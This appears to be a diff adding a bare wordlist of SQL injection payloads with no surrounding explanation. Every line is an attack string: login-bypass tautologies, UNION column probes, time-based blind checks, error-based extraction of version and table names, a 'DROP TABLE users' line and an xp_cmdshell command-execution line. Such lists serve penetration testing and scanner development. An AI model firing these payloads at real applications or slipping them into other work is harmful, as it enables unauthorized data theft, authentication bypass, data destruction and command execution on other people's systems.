@@ -1,0 +1,33 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+' OR 1=1 --
+' OR 1=1#
+' OR 1=1/*
+admin' --
+admin' #
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+' AND 1=1 --
+' AND 1=2 --
+' OR 'x'='x
+' OR ''='
+1; DROP TABLE users--
+'; EXEC xp_cmdshell('dir')--
+' WAITFOR DELAY '0:0:5'--
+1' AND SLEEP(5)#
+' OR BENCHMARK(10000000,SHA1('test'))--
+'; SELECT pg_sleep(5)--
+') OR ('1'='1
+')) OR (('1'='1
+' OR 1=1 LIMIT 1 --
+' UNION ALL SELECT 1,2,3--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND extractvalue(1,concat(0x7e,version()))--
+' OR updatexml(1,concat(0x7e,version()),1)--
